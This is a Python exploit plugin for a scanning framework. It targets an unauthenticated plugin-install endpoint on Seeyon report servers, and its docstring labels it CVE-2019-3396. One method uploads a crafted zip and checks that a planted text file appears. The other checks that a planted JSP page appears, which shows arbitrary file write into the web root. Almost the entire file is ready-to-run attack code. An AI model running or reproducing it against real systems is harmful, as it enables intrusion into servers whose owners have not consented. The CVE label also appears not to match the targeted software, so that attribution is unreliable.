#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: orleven

from lib.core.env import *
from aiohttp import FormData
from lib.util.aiohttputil import ClientSession
from lib.core.enums import ServicePortMap
from script import BaseScript

class Script(BaseScript):
    """
    CVE-2019-3396
    """

    def __init__(self):
        BaseScript.__init__(self)
        self.service_type = ServicePortMap.WEB
        self.name = 'CVE-2019-3396'

    async def prove(self):
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'seeyonreport/ReportServer?op=plugin&cmd=local_install'
                form = FormData()
                form.add_field('file', open(os.path.join(TOOL_PATH, 'seeyon_bak.zip'),'rb'), filename='1.zip', content_type='text/plain')
                async with session.post(url=url, data=form) as res:
                    if res!=None and res.status ==200:
                        url1 = self.base_url + 'seeyonreport/bak.txt'
                        async with session.get(url=url1) as res1:
                            if res1 != None and res1.status == 200:
                                text = await res1.text()
                                if 'This is a bak file' in text:
                                    yield url1

    async def upload(self):
        if self.base_url:
            async with ClientSession() as session:
                url = self.base_url + 'seeyonreport/ReportServer?op=plugin&cmd=local_install'
                form = FormData()
                form.add_field('file', open(os.path.join(TOOL_PATH, 'seeyon_bak.zip'),'rb'), filename='1.zip', content_type='text/plain')
                async with session.post(url=url, data=form) as res:
                    if res!=None and res.status ==200:
                        url1 = self.base_url + 'seeyonreport/test_bak.jsp'
                        async with session.get(url=url1) as res1:
                            if res1 != None and res1.status == 200:
                                text = await res1.text()
                                if 'This is a bak file' in text:
                                    yield url1